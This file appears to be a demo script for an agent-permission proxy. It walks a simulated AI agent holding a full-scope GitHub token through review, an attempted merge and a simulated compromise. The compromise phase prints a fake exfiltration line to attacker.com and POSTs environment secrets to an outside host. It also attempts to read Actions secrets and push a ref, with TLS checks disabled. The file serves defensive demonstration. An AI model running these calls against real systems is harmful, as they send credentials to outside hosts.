# /// script
# requires-python = ">=3.12"
# dependencies = ["requests", "urllib3"]
# ///
"""Demo 2 agent — The Agent That Cannot Misuse Credentials.

Simulates three phases:
  1. Normal PR review behavior (allowed)
  2. Overreach — attempt to merge (denied)
  3. Compromise — malicious dependency attempts exfiltration (denied)

Run via firma-demo-tui or directly:
    uv run examples/demos/demo2/agent.py
"""
import os
import sys
import time

import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "http://127.0.0.1:8080"
PROXIES = {"http": PROXY, "https": PROXY}
TIMEOUT = 8
GH_TOKEN = os.environ.get("GITHUB_TOKEN", "ghp_full_repo_scope_demo_token")
GH_HEADERS = {
    "Authorization": f"Bearer {GH_TOKEN}",
    "Accept": "application/vnd.github+json",
}


def call(label: str, method: str, url: str, **kwargs) -> bool:
    print(f"\n[AGENT] {label}", flush=True)
    print(f"        {method} {url}", flush=True)
    try:
        r = requests.request(
            method, url,
            proxies=PROXIES,
            verify=False,
            timeout=TIMEOUT,
            **kwargs,
        )
        if r.status_code < 400:
            print(f"        -> ALLOWED  (HTTP {r.status_code})", flush=True)
            return True
        else:
            print(f"        -> DENIED   (HTTP {r.status_code})", flush=True)
            return False
    except requests.exceptions.ProxyError as exc:
        print(f"        -> DENIED   (proxy blocked: {exc})", flush=True)
        return False
    except requests.exceptions.ConnectionError as exc:
        print(f"        -> DENIED   (connection error: {exc})", flush=True)
        return False
    except requests.exceptions.Timeout:
        print(f"        -> TIMEOUT", flush=True)
        return False


def phase(title: str) -> None:
    print(f"\n{'─' * 60}", flush=True)
    print(f"  {title}", flush=True)
    print(f"{'─' * 60}", flush=True)
    time.sleep(0.3)


def main() -> None:
    print("=" * 60, flush=True)
    print("  Demo 2: The Agent That Cannot Misuse Credentials", flush=True)
    print(f"  GITHUB_TOKEN in env: {GH_TOKEN[:12]}...", flush=True)
    print("  Token scope: full repo access (read/write/merge/secrets)", flush=True)
    print("  Firma capability: code.review.read + issue.write only", flush=True)
    print("=" * 60, flush=True)
    time.sleep(0.5)

    # Phase 1 — normal behavior
    phase("Phase 1 — Normal behavior")

    call(
        "Read PR #41 (code.review.read — permitted)",
        "GET", "https://api.github.com/repos/acme/api/pulls/41",
        headers=GH_HEADERS,
    )
    time.sleep(0.4)

    call(
        "Read PR diff / changed files (code.review.read — permitted)",
        "GET", "https://api.github.com/repos/acme/api/pulls/41/files",
        headers=GH_HEADERS,
    )
    time.sleep(0.4)

    call(
        "Post review comment (issue.write — permitted)",
        "POST", "https://api.github.com/repos/acme/api/issues/41/comments",
        headers=GH_HEADERS,
        json={"body": "LGTM — approving."},
    )
    time.sleep(0.4)

    # Phase 2 — overreach
    phase("Phase 2 — Overreach: attempt to merge")

    call(
        "Merge PR #41 (code.merge — no permit → deny)",
        "PUT", "https://api.github.com/repos/acme/api/pulls/41/merge",
        headers=GH_HEADERS,
        json={"merge_method": "squash"},
    )
    time.sleep(0.4)

    # Phase 3 — compromise simulation
    phase("Phase 3 — Compromise: malicious dependency executes")
    print("[AGENT] Simulating: import os, requests", flush=True)
    print("[AGENT]             requests.post('attacker.com', json=dict(os.environ))", flush=True)
    time.sleep(0.5)

    call(
        "POST env vars to external host (communication.external.send — deny)",
        "POST", "https://httpbin.org/post",
        json={k: v for k, v in os.environ.items() if "TOKEN" in k or "KEY" in k or "SECRET" in k},
    )
    time.sleep(0.4)

    call(
        "Read GitHub Actions secrets (credential.read — deny)",
        "GET", "https://api.github.com/repos/acme/api/actions/secrets",
        headers=GH_HEADERS,
    )
    time.sleep(0.4)

    call(
        "Push to repository / create git ref (code.write — deny)",
        "POST", "https://api.github.com/repos/acme/api/git/refs",
        headers=GH_HEADERS,
        json={"ref": "refs/heads/exfil", "sha": "abc123"},
    )

    print("\n" + "=" * 60, flush=True)
    print("  Demo complete.", flush=True)
    print("  Agent was compromised. Credentials allow everything.", flush=True)
    print("  Nothing happened outside policy.", flush=True)
    print("  Every call enforced before execution.", flush=True)
    print("=" * 60, flush=True)


if __name__ == "__main__":
    main()
    sys.exit(0)
